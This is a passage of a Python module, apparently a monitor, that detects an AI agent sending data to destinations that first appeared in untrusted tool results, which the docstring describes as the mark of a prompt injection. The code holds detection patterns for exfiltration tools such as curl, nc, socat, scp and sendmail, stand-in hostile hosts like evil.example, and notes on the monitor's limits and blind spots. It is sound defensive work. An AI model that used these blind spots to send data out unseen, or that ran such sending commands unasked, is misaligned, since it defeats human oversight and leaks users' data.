"""Provenance: is the agent sending to someone its user never named?

The first behavioural check on adapter 1. The DLP tiers ask whether
content is sensitive. This asks who an action is FOR.

An inference-hook frame carries the whole conversation: the user's words,
the agent's earlier `tool_use` blocks, and the `tool_result` blocks that
came back. So every destination an agent has sent to can be traced to where
it first appeared:

* **the user's own text**, or the operator's allowlist: trusted
* **a tool result or an attachment**: untrusted content -- a fetched page,
  a file, an email body, an MCP response
* **nowhere earlier**: the agent introduced it itself

A sending action whose destination first appeared in untrusted content, and
never in the user's words, is the shape a prompt injection leaves: the page
names a destination and the agent uses it. That is what this reports.

Two limits are the design, not omissions:

* **Only sending counts.** An agent that searches and then fetches a result
  is browsing. Flagging every fetch of a URL found in a search result would
  fire on every research task. So a destination is checked only when the
  action carries data out: a request with a body or a substituted value, an
  upload, a copy to a remote host, a message to a recipient.
* **It sees the action after it ran.** The hook sees the input to each model
  call, never the response, so a tool call reaches it one frame after it
  executed. A finding here can halt the agent at its next step; it cannot
  un-send the request. Prevention is adapter 2's `PreToolUse`.

WHAT A FINDING CARRIES. The detector id, a salted digest of the
destination, a locator built from structure, and a tool name only if it is
a plain identifier. Tool-input keys and tool names are sender-controlled, and
an early version put both in the finding verbatim, so a tool named
`send-evil.example` or an input keyed by a URL published the destination to
the log and the store. A key survives into the locator only if it is one of
the names below; any other is replaced by its position.
"""

from __future__ import annotations

import contextlib
import hashlib
import ipaddress
import itertools
import posixpath
import re
import secrets
import threading
import time
from collections import OrderedDict
from collections.abc import Iterable, Iterator, Sequence
from dataclasses import dataclass, field
from urllib.parse import urlsplit

from ..models import BLOCK_LOCATOR, NOT_TAINT_SOURCES, Finding, digest, load_json

DETECTOR = "provenance:untrusted-destination"
TAINT_DETECTOR = "taint:sensitive-data-sent"

# Each block's text is read up to this many characters when looking for
# destinations. A tool result can be 64 MiB; reading all of it on every
# frame cost half a second, outside the scan budget, on a path with a
# delivery timeout. A destination past the cut is missed -- a false
# negative at `warn`, stated here rather than discovered.
MAX_BLOCK_CHARS = 1 << 20

# ...and at most this many containers and strings are visited per block,
# so a result holding a million small values is not walked whole.
MAX_BLOCK_NODES = 20_000

# A message is recognised from at most this many nodes of its structure.
FINGERPRINT_NODES = 256

# Sessions whose analysis is resumed rather than repeated. Frames are
# cumulative, so without this every frame re-read the whole transcript.
MAX_SESSIONS = 10_000

# Per-session bounds. Every set here only grows, and a long session with
# attacker-controlled tool results could otherwise make one session's
# state -- and its share of MAX_SESSIONS -- as large as the transcript.
MAX_TAINTED = 2_000
MAX_TOKENS = 5_000
MAX_PENDING_CALLS = 5_000
MAX_SESSION_FINDINGS = 500
# Hosts kept per session in each of `trusted` and `untrusted`. Once
# `untrusted` is full, every send to a host the user did not name is
# reported, as if the host had been named by untrusted content.
MAX_HOSTS = 10_000

# Wall-clock limit on one frame's pass, checked per block and per string of
# a tool call. A pass cut short reports the checks it did not finish in
# `Outcome.dropped`; the session's next frame resumes where it stopped.
TIME_BUDGET_S = 0.25


class _Budget:
    """Characters and nodes one walk may spend, shared by everything it yields."""

    __slots__ = ("chars", "nodes")

    def __init__(self, chars: int = MAX_BLOCK_CHARS, nodes: int = MAX_BLOCK_NODES):
        self.chars = chars
        self.nodes = nodes

    def spent(self) -> bool:
        return self.chars <= 0 or self.nodes <= 0

# ---------------------------------------------------------------------------
# Destinations

_URL = re.compile(r"\b(?:https?|ftps?|wss?)://[^\s\"'<>`]+", re.IGNORECASE)
# An address: `\b[A-Za-z0-9._%+-]{1,64}@` then this domain. The domain is
# matched once per `@` and the local part checked behind it.
_EMAIL_DOMAIN = re.compile(r"@((?:[A-Za-z0-9-]{1,63}+\.){1,126}[A-Za-z]{2,24})\b")
_EMAIL_LOCAL = re.compile(r"\b[A-Za-z0-9._%+-]{1,64}@")
# A hostname standing on its own. Two labels at least, alphabetic TLD.
_BARE_HOST = re.compile(
    r"(?<![\w@/.-])((?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.){1,126}"
    r"[A-Za-z]{2,24})(?![\w-])")
_BARE_IPV4 = re.compile(r"(?<![\w.])(\d{1,3}(?:\.\d{1,3}){3})(?!\w|\.\d)")
_HOSTNAME = re.compile(
    r"^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,126}(?:[a-z]{2,24}|xn--[a-z0-9-]{1,59})\Z")
_TRAILING = ".,;:!?)]}>'\""

# Suffixes under which anyone can register a name. Trusting one would trust
# every tenant beneath it -- naming `vercel.app` must not vouch for an
# attacker's `x.vercel.app`. Not the full Public Suffix List, which would
# need a dependency the base image does not carry; the cases that matter
# here are the country second levels and the hosting platforms.
_PUBLIC_SUFFIXES = frozenset({
    "co.uk", "org.uk", "ac.uk", "gov.uk", "me.uk", "ltd.uk", "plc.uk", "net.uk", "com.au",
    "net.au", "org.au", "edu.au", "gov.au", "co.nz", "org.nz", "co.jp", "ne.jp", "or.jp",
    "com.br", "com.cn", "com.hk", "com.sg", "com.mx", "com.ar", "com.tr", "co.in", "co.za",
    "co.kr", "co.il", "github.io", "gitlab.io", "herokuapp.com", "azurewebsites.net",
    "cloudfront.net", "amazonaws.com", "s3.amazonaws.com", "blob.core.windows.net", "web.app",
    "firebaseapp.com", "pages.dev", "workers.dev", "vercel.app", "netlify.app", "ngrok.io",
    "ngrok-free.app", "appspot.com", "glitch.me", "repl.co", "onrender.com", "fly.dev",
})


def _host(raw: str) -> str | None:
    """Normalise a host: lowercase, IDNA, IP literals kept. None if not one.

    `www.` is NOT stripped. Stripping it made a user who named
    `www.acme.example` trust `acme.example` and so every subdomain of it.
    """
    raw = raw.strip()
    if not raw or len(raw) > 512:
        return None
    # An IPv6 literal is tried before trailing punctuation is stripped,
    # which would take the leading `::` of `::ffff:192.0.2.1`.
    for h in (raw.strip("[]").lower(), raw.strip(_TRAILING).strip("[]").rstrip(".").lower()):
        try:
            ip = ipaddress.ip_address(h)
        except ValueError:
            continue
        # `::ffff:192.0.2.1` is 192.0.2.1 to a client.
        mapped = getattr(ip, "ipv4_mapped", None)
        return str(mapped or ip)
    h = raw.strip(_TRAILING).strip("[]").rstrip(".").lower()
    if not h:
        return None
    try:
        h = h.encode("idna").decode("ascii")
    except (UnicodeError, ValueError):
        return None
    return h if _HOSTNAME.match(h) else None


_INET_PART = re.compile(r"0x[0-9a-f]{1,8}|0[0-7]{0,11}|[1-9][0-9]{0,9}", re.IGNORECASE)


def _inet_aton(raw: str) -> str | None:
    """An IPv4 address in the forms a URL client resolves without DNS:
    `16909060`, `0x01020304`, `1.2.772`, `0177.0.0.1`. None otherwise."""
    parts = raw.rstrip(".").split(".")
    if not 1 <= len(parts) <= 4 or not all(_INET_PART.fullmatch(p) for p in parts):
        return None
    nums = [int(p, 16) if p[:2].lower() == "0x" else int(p, 8) if p.startswith("0") else int(p)
            for p in parts]
    last_bits = 8 * (5 - len(nums))
    if any(n > 255 for n in nums[:-1]) or nums[-1] >= 1 << last_bits:
        return None
    value = nums[-1]
    for i, n in enumerate(nums[:-1]):
        value |= n << (24 - 8 * i)
    return str(ipaddress.IPv4Address(value))


def _url_host(url: str) -> str | None:
    try:
        parts = urlsplit(url.rstrip(_TRAILING))
        raw = parts.hostname or ""
    except ValueError:
        return None
    return _host(raw) or _inet_aton(raw)


class _OutOfTime(Exception):
    """The pass reached its deadline."""


class _Clock:
    """A pass's deadline. It is not enforced until `armed`, which a pass sets
    once it has finished one block, so every frame of a session moves the
    session forward by at least a block."""

    __slots__ = ("armed", "deadline")

    def __init__(self, deadline: float) -> None:
        self.deadline = deadline
        self.armed = False


def _check_time(clock: _Clock | None) -> None:
    if clock is not None and clock.armed and time.monotonic() > clock.deadline:
        raise _OutOfTime


# Last labels of file names a user types: `setup.sh`, `README.md`, `main.rs`.
# Several are real TLDs, so a bare word ending in one is not taken from the
# user's text as a destination they named.
_FILE_EXTENSIONS = frozenset({
    "sh", "bash", "zsh", "md", "rs", "py", "pl", "pm", "rb", "js", "ts", "go", "cc", "cs",
    "mm", "so", "la", "mo", "ps", "tf", "ml", "sc", "mk", "am", "ac", "in", "do", "ms", "st",
    "ly", "bz", "gd", "nc", "pt", "re", "sv", "kt", "fs", "hs", "ex", "el", "zip", "mov",
    "rest", "json", "yaml", "yml", "toml", "txt", "log", "lock", "cfg", "ini", "conf", "env",
    "html", "css", "xml", "csv", "sql", "pdf", "png", "jpg", "svg", "gif", "java", "cpp",
    "php", "swift", "scala", "lua", "dart", "vue", "tsx", "jsx", "ipynb", "tar", "gz", "tgz",
    "bak", "tmp", "old", "orig", "diff", "patch", "pem", "key", "crt", "pub"})
# Last labels accepted for a bare host in the user's text, besides any two
# letters: the common generic TLDs, and names nobody can register.
_BARE_TLDS = frozenset({
    "com", "net", "org", "edu", "gov", "mil", "int", "info", "biz", "io", "ai", "dev",
    "cloud", "tech", "xyz", "site", "online", "page", "blog", "shop", "store", "systems",
    "software", "tools", "network", "services", "solutions", "digital", "company", "team",
    "example", "test", "invalid", "localhost", "local", "internal", "corp", "lan", "home",
    "intranet", "private"})


def _user_named_bare(host: str) -> bool:
    """A bare hostname in the user's own words reads as a destination."""
    tld = host.rsplit(".", 1)[-1]
    if tld in _FILE_EXTENSIONS:
        return False
    return tld in _BARE_TLDS or len(tld) == 2 or tld.startswith("xn--")


def mentioned(text: str, clock: _Clock | None = None, *, user: bool = False) -> set[str]:
    """Every host a piece of prose names: URLs, emails, bare hostnames.

    With `user`, a bare hostname counts only if `_user_named_bare` accepts
    it; URLs, addresses and IP literals count as written.
    """
    text = text[:MAX_BLOCK_CHARS]
    out: set[str] = set()
    for n, m in enumerate(_URL.finditer(text)):
        if n % 4096 == 4095:
            _check_time(clock)
        h = _url_host(m.group(0))
        if h:
            out.add(h)
    _check_time(clock)
    for n, domain in enumerate(_email_domains(text)):
        if n % 4096 == 4095:
            _check_time(clock)
        h = _host(domain)
        if h:
            out.add(h)
    _check_time(clock)
    for n, m in enumerate(_BARE_HOST.finditer(text)):
        if n % 4096 == 4095:
            _check_time(clock)
        h = _host(m.group(1))
        if h and (not user or _user_named_bare(h)):
            out.add(h)
    _check_time(clock)
    for m in _BARE_IPV4.finditer(text):
        h = _host(m.group(1))
        if h:
            out.add(h)
    return out


def _email_domains(text: str) -> Iterator[str]:
    """The domain of each address in `text`, in order."""
    pos = 0
    for m in _EMAIL_DOMAIN.finditer(text):
        at = m.start()
        lo = max(pos, at - 64, text.rfind("@", pos, at) + 1)
        if _EMAIL_LOCAL.search(text, lo, at + 1) is not None:
            yield m.group(1)
            pos = m.end()


def _urls(text: str) -> set[str]:
    return {h for m in _URL.finditer(text[:MAX_BLOCK_CHARS]) if (h := _url_host(m.group(0)))}


def _recipient_hosts(text: str) -> set[str]:
    """A destination-shaped field: URLs, emails, or bare hosts, comma lists."""
    out = set(_urls(text))
    for part in re.split(r"[,;\s]+", text[:4096]):
        part = part.strip(_TRAILING + "<(")
        h = _host(part.rsplit("@", 1)[1] if "@" in part else part)
        if h:
            out.add(h)
    return out


# ---------------------------------------------------------------------------
# Which actions send

_HTTP_CLIENTS = {"curl", "wget", "http", "https", "xh", "xhs", "httpie"}
_HTTPIE = {"http", "https", "xh", "xhs", "httpie"}
_PS_HTTP = {"invoke-webrequest", "invoke-restmethod", "iwr", "irm"}
_HOST_FIRST = {"nc", "ncat", "netcat", "telnet", "socat"}
_REMOTE_COPY = {"scp", "rsync"}
_REMOTE_SHELL = {"ssh", "sftp"}
_MAILERS = {"mail", "mailx", "sendmail", "mutt"}
_INTERPRETERS = {"python", "python3", "node", "deno", "bun", "ruby", "perl", "php"}

# curl's short options that send a body, and those that take an argument.
# In a cluster such as `-sSLd`, the first letter taking an argument takes
# the rest of the word, or the next word when it ends the cluster.
_CURL_SEND_SHORT = frozenset("dFT")
_SHORT_ARGS = {
    "curl": frozenset("AbcCdDeEFhHKmoPQrtTuUwxXyYz"),
    "wget": frozenset("aABDeiIlLoOpPQRtTUwX"),
    "ssh": frozenset("bBcDEeFIiJLlmOopQRSWw"),
    "sftp": frozenset("BbcDFiJloPRSs"),
    "nc": frozenset("eiIOpPqsTVwxX"),
}
_CURL_SEND_LONG = re.compile(
    r"--(?:data(?:-\w+)?|json|form(?:-string)?|upload-file)\Z", re.IGNORECASE)
_WGET_SEND_LONG = re.compile(r"--(?:post|body)-(?:data|file)\Z", re.IGNORECASE)
# Long options of curl and wget whose value is the next word unless glued
# with `=`. A value read as an operand could only add a destination.
_LONG_ARGS = frozenset({
    "--data", "--data-ascii", "--data-binary", "--data-raw", "--data-urlencode", "--json",
    "--form", "--form-string", "--upload-file", "--header", "--output", "--user",
    "--user-agent", "--referer", "--request", "--method", "--cookie", "--cookie-jar",
    "--proxy", "--cert", "--key", "--cacert", "--capath", "--config", "--max-time",
    "--connect-timeout", "--retry", "--retry-delay", "--write-out", "--resolve",
    "--connect-to", "--interface", "--output-dir", "--range", "--limit-rate",
    "--oauth2-bearer", "--aws-sigv4", "--unix-socket", "--url-query", "--variable",
    "--post-data", "--post-file", "--body-data", "--body-file", "--output-document",
    "--output-file", "--directory-prefix", "--tries", "--timeout", "--wait", "--level",
    "--load-cookies", "--save-cookies", "--http-user", "--http-password", "--auth"})
# An httpie request item that carries data: `k=v`, `k:=json`, `k@file`,
# `k=@file`, `k==query`.
_HTTPIE_ITEM = re.compile(r"\A[^\s=:@/\\-][^\s=:@/\\]{0,255}+(?:=|:=|@)")
_SEND_METHODS = {"post", "put", "patch"}
_CODE_SENDS = re.compile(
    r"\.(?:post|put|patch)\s*\(|method\s*[:=]\s*['\"](?:post|put|patch)|"
    r"urlopen\s*\((?:(?!urlopen\s*\()[^)]){0,1024}data\s*=|\bdata\s*=|\bbody\s*[:=]|sendall\s*\(|"
    r"\.send\s*\(|smtplib|Net::HTTP::Post|\bupload",
    re.IGNORECASE)
_SUBSTITUTED = re.compile(r"\$\(|`")

# One control operator (group 1) or one shell word (group 2). A word keeps
# its quotes, escapes and the `&` of `2>&1` and `&>file`; an unclosed quote
# takes the rest of the text. Each alternative consumes what it examined,
# so a pass is linear in the text.
_SHELL_TOKEN = re.compile(
    r"""(\|\||&&|[|;\n]|&(?!>))"""
    r"""|((?:[^\s'"\\|;&]++|(?<=[<>])&|&(?=>)|'[^']*+'|"(?:[^"\\]++|\\.)*+"|\\.|['"\\].*)++)""",
    re.DOTALL)
_QUOTED = re.compile(r"""'([^']*+)'?|"((?:[^"\\]++|\\.)*+)"?|\\(.)""", re.DOTALL)
_DQ_ESCAPE = re.compile(r"""\\([$`"\\])""")
_ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]{0,63}=")
_VARIABLE = re.compile(r"\$(?:\{([A-Za-z_][A-Za-z0-9_]{0,63})\}|([A-Za-z_][A-Za-z0-9_]{0,63}))")
_SOCAT_ADDRESS = re.compile(
    r"(?:tcp|tcp4|tcp6|udp|udp4|udp6|openssl|ssl|tcp-connect|udp-sendto)[:-]"
    r"([^:,]{1,255}):", re.IGNORECASE)
_REDIRECT = re.compile(r"[0-9]{0,2}(?:<<?<?|>>?|&>>?|>&|<&)")
# How deep `sh -c '...'` is followed into its argument.
_MAX_NESTING = 3
_MAX_VARIABLES = 64
_MAX_VALUE_CHARS = 4096


def _unquote(match: re.Match[str]) -> str:
    single, double, escaped = match.group(1, 2, 3)
    if single is not None:
        return single
    if double is not None:
        return _DQ_ESCAPE.sub(r"\1", double)
    return escaped


def _tokens(command: str) -> Iterator[tuple[str, bool]]:
    """(text, whether it is a control operator) for each token of a shell
    command, quotes removed. A backslash-newline joins two lines."""
    for m in _SHELL_TOKEN.finditer(command.replace("\\\n", "  ")):
        op, word = m.group(1, 2)
        if op is not None:
            yield op, True
        elif "'" in word or '"' in word or "\\" in word:
            yield _QUOTED.sub(_unquote, word), False
        else:
            yield word, False


def _words(command: str, limit: int | None = None) -> list[str]:
    """The words of a shell command, quotes removed, operators left out."""
    out: list[str] = []
    for text, op in _tokens(command):
        if not op:
            out.append(text)
            if limit is not None and len(out) >= limit:
                break
    return out


def _segments(command: str, limit: int | None = None) -> Iterator[tuple[list[str], bool]]:
    """(command words, whether a pipe feeds it). `;`, `&&` and a newline do
    not feed: `cd site && curl URL` is a fetch. At most `limit` words."""
    seg: list[str] = []
    piped = False
    count = 0
    for text, op in _tokens(command):
        if op:
            if seg:
                yield seg, piped
            seg, piped = [], text == "|"
            continue
        seg.append(text)
        count += 1
        if limit is not None and count >= limit:
            break
    if seg:
        yield seg, piped


def _prog(word: str) -> str:
    return word.rsplit("/", 1)[-1].lower()


def _expand(word: str, env: dict[str, str]) -> str:
    """`word` with a leading `$NAME` or `${NAME}` replaced by its value,
    when an earlier segment of the command assigned one."""
    m = _VARIABLE.match(word)
    if m is None:
        return word
    value = env.get(m.group(1) or m.group(2))
    return word if value is None else value + word[m.end():]


def _bare_destination(word: str) -> str | None:
    """The host of an operand written without a scheme: `evil.example/c`,
    `user@10.0.0.1:2222`."""
    hostport = word[:512].split("/", 1)[0].rsplit("@", 1)[-1]
    if hostport.startswith("["):
        hostport = hostport[1:].split("]", 1)[0]
    elif hostport.count(":") == 1:
        hostport = hostport.split(":", 1)[0]
    return _host(hostport)


def _shell_c_command(args: list[str]) -> str | None:
    """The command `sh -c`, `bash -lc` or `zsh -ec` runs, if any."""
    for k, a in enumerate(args):
        if a.startswith("-") and not a.startswith("--") and "c" in a[1:]:
            return args[k + 1] if k + 1 < len(args) else None
    return None


def _options(args: list[str], short_args: frozenset[str]) -> Iterator[tuple[str, str | None]]:
    """(option or "", its value, or the operand when the option is "") for
    each option and operand. `--` ends the options."""
    i = 0
    while i < len(args):
        a = args[i]
        i += 1
        if a == "--":
            for rest in args[i:]:
                yield "", rest
            return
        if a.startswith("--"):
            name, eq, value = a.partition("=")
            if not eq and name.lower() in _LONG_ARGS and i < len(args):
                value, i = args[i], i + 1
            yield name.lower(), value
        elif a.startswith("-") and len(a) > 1:
            for j, letter in enumerate(a[1:], 1):
                if letter in short_args:
                    value = a[j + 1:]
                    if not value and i < len(args):
                        value, i = args[i], i + 1
                    yield "-" + letter, value
                    break
                yield "-" + letter, None
        elif (m := _REDIRECT.match(a)) is not None:
            if m.end() < len(a):
                yield a[:m.end()], a[m.end():]
                continue
            # `< file`: the next word is the redirect's target.
            target = args[i] if i < len(args) else ""
            i += 1
            yield a, target
        else:
            yield "", a


def _http_sends(prog: str, args: list[str], piped_in: bool,
                joined: str) -> tuple[bool, set[str]]:
    """(whether an HTTP client invocation sends, where to)."""
    short = _SHORT_ARGS["wget" if prog == "wget" else "curl"]
    method = ""
    sends = piped_in or bool(_SUBSTITUTED.search(joined))
    operands: list[str] = []
    for opt, value in _options(args, frozenset() if prog in _HTTPIE else short):
        if not opt:
            operands.append(value or "")
            continue
        low = opt.lower()
        if (opt == "-X" and prog != "wget") or low in ("--request", "--method"):
            method = (value or "").lower()
        elif prog == "wget":
            sends = sends or bool(_WGET_SEND_LONG.match(opt))
        elif prog in _HTTPIE:
            sends = sends or low in ("--form", "-f", "--raw") or opt.startswith("<")
        else:
            sends = sends or opt[1:] in _CURL_SEND_SHORT or bool(_CURL_SEND_LONG.match(opt))
        if opt == "--url" and value:
            operands.append(value)
    if prog in _HTTPIE and operands and operands[0].lower() in (
            "get", "post", "put", "patch", "delete", "head", "options"):
        method = method or operands[0].lower()
        operands = operands[1:]
    if prog in _HTTPIE:
        sends = sends or any(_HTTPIE_ITEM.match(o) for o in operands[1:])
    sends = sends or method in _SEND_METHODS
    if not sends:
        return False, set()
    out = _urls(joined)
    for o in operands:
        if "://" not in o and (h := _bare_destination(o)):
            out.add(h)
    return True, out


def shell_sends(command: str, clock: _Clock | None = None,
                _depth: int = 0) -> tuple[bool, set[str]]:
    """(whether a shell command sends anything off the machine, the hosts it
    sends to). A send whose destination cannot be read -- `curl -d @f $U`
    -- is a send with no hosts.

    Parsed per command, so an upload SOURCE (`-d @report.json`) or a local
    path is never taken for a destination -- only URLs in a sending command
    and the remote-host positions of copy and socket tools are. Wrappers
    (`sudo`, `timeout 5`, `env`, `xargs`) are looked through, `sh -c` is
    followed into its argument, and `NAME=value` assigned earlier in the
    command is substituted for a leading `$NAME`.
    """
    sends = False
    out: set[str] = set()
    env: dict[str, str] = {}
    for n, (seg, piped_in) in enumerate(_segments(command[:MAX_BLOCK_CHARS])):
        if n % 1024 == 1023:
            _check_time(clock)
        if "=" not in seg[0] and _prog(seg[0]) not in _FIRST_WORDS:
            continue
        words = seg[1:] if seg[0] == "export" else seg
        if words and all(_ASSIGNMENT.match(w) for w in words):
            for w in words:
                name, _, value = w.partition("=")
                if name in env or len(env) < _MAX_VARIABLES:
                    env[name] = value[:_MAX_VALUE_CHARS]
            continue
        if env:
            seg = [_expand(w, env) for w in seg]
        seg = _unwrap(seg)
        if not seg:
            continue
        prog = _prog(seg[0])
        args = seg[1:]
        if prog in _SHELLS or prog == "eval":
            inner = " ".join(args) if prog == "eval" else _shell_c_command(args)
            if inner and _depth < _MAX_NESTING:
                s, hosts = shell_sends(inner, clock, _depth + 1)
                sends, out = sends or s, out | hosts
            continue
        if prog in _HTTP_CLIENTS:
            s, hosts = _http_sends(prog, args, piped_in, " ".join(seg))
        elif prog in _PS_HTTP:
            low = [a.lower() for a in args]
            method = next((low[i + 1] for i, a in enumerate(low[:-1]) if a == "-method"), "")
            s = method in _SEND_METHODS or "-body" in low or "-infile" in low
            hosts = _urls(" ".join(seg)) if s else set()
        elif prog in _HOST_FIRST:
            ops = [v for o, v in _options(args, _SHORT_ARGS["nc"]) if not o and v]
            if prog == "socat":
                hosts = {h for o in ops if (m := _SOCAT_ADDRESS.match(o))
                         and (h := _host(m.group(1)))}
            else:
                hosts = {h for h in (_host(o) for o in ops[:1]) if h}
            s = True
        elif prog in _REMOTE_SHELL:
            ops = [v for o, v in _options(args, _SHORT_ARGS[prog]) if not o and v]
            hosts = {h for h in (_bare_destination(o) for o in ops[:1]) if h}
            s = True
        elif prog in _REMOTE_COPY:
            hosts = set()
            for a in args:
                if a.startswith("-"):
                    continue
                if a.lower().startswith("rsync://"):
                    hosts |= {h for h in [_url_host(a)] if h}
                    continue
                m = re.match(r"^(?:[^@\s/]+@)?([^:/\s]+):", a)
                if m and (h := _host(m.group(1))):
                    hosts.add(h)
            s = True
        elif prog in _MAILERS:
            hosts = {h for a in args if "@" in a and (h := _host(a.rsplit("@", 1)[1]))}
            s = bool(hosts) or prog == "sendmail" or any(not a.startswith("-") for a in args)
        elif prog in _INTERPRETERS:
            code = " ".join(a for a in args if not a.startswith("-"))
            s = bool(_CODE_SENDS.search(code))
            hosts = _urls(code) if s else set()
        else:
            continue
        sends = sends or s
        out |= hosts
    return sends, out


def shell_destinations(command: str) -> set[str]:
    """Hosts a shell command SENDS to. Empty for a command that only fetches."""
    return shell_sends(command)[1]


# Keys whose names say where a message or payload goes.
_RECIPIENT_KEYS = frozenset({
    "to", "cc", "bcc", "recipient", "recipients", "email", "emails", "address",
    "webhook", "webhook_url", "endpoint", "destination", "target_url",
    "callback_url", "channel_url"})
# Keys that carry a shell command, besides any ending in `_command`,
# `_cmd` or `_script`.
_COMMAND_KEYS = frozenset({"command", "cmd", "script", "commands", "cmdline",
                           "command_line", "shell"})
# For a sending tool, the fields that say WHERE. URLs in any other field --
# a message body, a description -- are payload, not destination: counting
# them let a trusted URL placed in the text exempt a send whose real target
# was a channel nothing could read.
_URL_KEYS = frozenset({"url", "uri", "link", "href", "target", "host", "server"})
# Destinations that are not hosts: channels, rooms, user and chat ids. Read
# as opaque values, trusted only if the user named them.
# Fields of a sending tool that are content, not destination. A field in
# none of these sets is UNCLASSIFIED, and a sending call with one gets no
# trusted-destination exemption: a trusted `url` beside an unread
# `queue="#evil"` said nothing about where the data went.
_PAYLOAD_KEYS = frozenset({
    "text", "body", "message", "content", "subject", "title", "data", "payload",
    "blob", "description", "summary", "html", "markdown", "caption", "comment",
    "note", "attachment", "attachments", "name", "filename", "format", "type",
    "headers", "method", "priority", "tags", "labels", "metadata",
    # Microsoft Graph's spellings, lowercased: an Outlook send to a recipient
    # the user named lost its exemption to `bodyType` alone.
    "bodytype", "htmlbody", "contenttype", "importance"})
# A field naming another agent in the same product: a subagent handing
# results back to its orchestrator. A call addressed only to one sends
# nothing out of the product; the agent that acts on it is judged on its
# own calls.
_INTERNAL_KEYS = frozenset({"agent_id", "agent", "subagent", "subagent_id", "agent_name"})
# Tools that deliver to the session's own user: Cowork's notification and
# file hand-back. The user is the one party a send cannot leak to.
_TO_USER_TOOLS = frozenset({"pushnotification", "senduserfile"})
# Fields whose value is a file to send. Path matching runs on these and on
# shell commands only -- matching prose made "package.json was updated" in
# a chat message count as sending package.json.
_FILE_KEYS = frozenset({"file_path", "filepath", "path", "file", "files",
                        "source", "src", "upload", "attachment_path", "local_path"})
_OPAQUE_KEYS = frozenset({"channel", "channel_id", "channel_name", "room", "room_id",
                          "conversation", "conversation_id", "thread", "thread_id",
                          "chat", "chat_id", "recipient_id", "user_id", "group",
                          "group_id", "team", "team_id", "space", "space_id"})
# Key names allowed into a locator. Anything else is sender data and is
# replaced by its position.
_SAFE_KEYS = _RECIPIENT_KEYS | _COMMAND_KEYS | _URL_KEYS | _OPAQUE_KEYS | frozenset({
    "url", "uri", "body", "data", "code", "content", "text", "message",
    "subject", "path", "file", "method", "headers", "payload", "input"})

_SHELL_TOOLS = frozenset({"bash", "shell", "sh", "zsh", "powershell", "pwsh",
                          "terminal", "run_command", "execute_command"})
# A tool whose name has one of these words runs what it is given in a shell:
# `run_shell`, `local_shell`, `terminal_exec`.
_SHELL_WORDS = frozenset({"bash", "shell", "zsh", "terminal", "powershell", "pwsh"})
# A tool whose name has one of these and one of `_EXEC_WORDS` does too:
# `run_command`, `execute_cmd`.
_COMMAND_WORDS = frozenset({"command", "cmd"})
_EXEC_WORDS = frozenset({"run", "exec", "execute"})
# A tool sends by nature if its name has a sending verb and no reading one.
# Matched on whole words of the name, never substrings: `search_messages`
# contains "message" and sends nothing.
_SEND_VERBS = frozenset({"send", "post", "upload", "publish", "share", "notify",
                         "forward", "reply", "submit", "transmit", "push",
                         "deliver", "invite"})
_READ_VERBS = frozenset({"search", "list", "get", "read", "fetch", "find", "query",
                         "status", "lookup", "describe", "view", "check", "count"})


# ---------------------------------------------------------------------------
# Paths, for taint

_PATH_KEYS = frozenset({"file_path", "filepath", "path", "file", "filename",
                        "source", "src", "notebook_path"})
# Keys whose value is one path a call reads. Every other key is read for
# paths only when it holds a shell command.
_READ_KEYS = _PATH_KEYS | _FILE_KEYS | frozenset({"paths"})
_HOME = re.compile(r"^(?:\$\{?HOME\}?|/home/[^/]+|/Users/[^/]+|/root|~[A-Za-z0-9_.-]+)(?=/)")
# A shell word that names a file on its own: absolute, home-relative,
# dot-relative, or a dotfile. Used to RECORD what a call read; matching a
# tainted path is looser, because it compares against a known set.
_PATHLIKE = re.compile(r"^(?:/|~/)|^\.[A-Za-z0-9_-]+(?:/|$)")
# Programs whose bare operands are files they read: `cat secrets.txt`.
_READERS = frozenset({"cat", "head", "tail", "less", "more", "base64", "xxd", "od",
                      "strings", "cp", "tar", "zip", "gzip", "openssl", "jq", "grep",
                      "sed", "awk", "type", "get-content", "gc"})
# Prefixes that run the next word as the program.
_WRAPPERS = frozenset({"sudo", "doas", "env", "command", "nohup", "time", "nice",
                       "exec", "xargs", "timeout", "stdbuf"})
_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh"})
# The first words of a segment `shell_sends` reads further.
_FIRST_WORDS = frozenset(
    _HTTP_CLIENTS | _PS_HTTP | _HOST_FIRST | _REMOTE_COPY | _REMOTE_SHELL | _MAILERS
    | _INTERPRETERS | _WRAPPERS | _SHELLS | {"export", "eval"})
# Readers whose FIRST operand is a pattern, script or subcommand, not a file.
_PATTERN_FIRST = frozenset({"grep", "egrep", "fgrep", "rg", "sed", "awk", "jq", "openssl"})
_PATH_LIMIT = 256
# Shell punctuation around a word: `$(cat x)`, `"x"`, `x;`, `<x`, `f=@x`.
_LEAD_WRAP = frozenset("\"'`(")
_TRAIL_WRAP = frozenset("\"'`);,|&")


def _strip_shell_wrap(word: str) -> str:
    """`word` without leading whitespace, quotes, backticks and `(`, and without
    trailing whitespace, quotes, backticks and `);,|&`.

    The regex this replaces, `^[...]*|[...]*$`, retried the trailing run
    from every position of an inner run of those characters: a 64 KB quoted
    word took seconds.
    """
    i, j = 0, len(word)
    while i < j and (word[i].isspace() or word[i] in _LEAD_WRAP):
        i += 1
    while j > i and (word[j - 1].isspace() or word[j - 1] in _TRAIL_WRAP):
        j -= 1
    return word[i:j]


def _canon(word: str) -> str | None:
    """One spelling per file.

    `$HOME/`, `${HOME}/`, `/home/<u>/`, `/Users/<u>/` and `~<u>/` all become
    `~/`; a leading `./` is dropped, so `secrets.txt` and `./secrets.txt`
    are the same file. Links and aliases are NOT resolved -- the hook sees
    text, not a filesystem -- so a symlink to a read file does not join.
    """
    if len(word) > 4 * 1024:
        return None
    w = _strip_shell_wrap(word.strip())
    w = w.lstrip("$(").strip("'\"`")
    # Upload and redirect prefixes: `-F f=@path`, `--data=@path`, `@path`,
    # `<path`. A plain `key=value` is an assignment, not a file.
    m = re.match(r"^[^=@<>]*=@(.+)\Z", w) or re.match(r"^[@<>]+(.+)\Z", w)
    if m:
        w = m.group(1)
    elif "=" in w:
        return None
    if not w or "://" in w or len(w) > 1024 or w.startswith("-"):
        return None
    w = _HOME.sub("~", w)
    # `.` and `..` collapsed, so `dir/../secrets.txt` is `secrets.txt`.
    # posixpath keeps a leading `..` it cannot resolve, which is right: the
    # hook does not know the working directory.
    w = posixpath.normpath(w)
    return None if w in (".", "") else w


def _read_paths(key: str, text: str) -> set[str]:
    """Files a call names in a way that could READ them."""
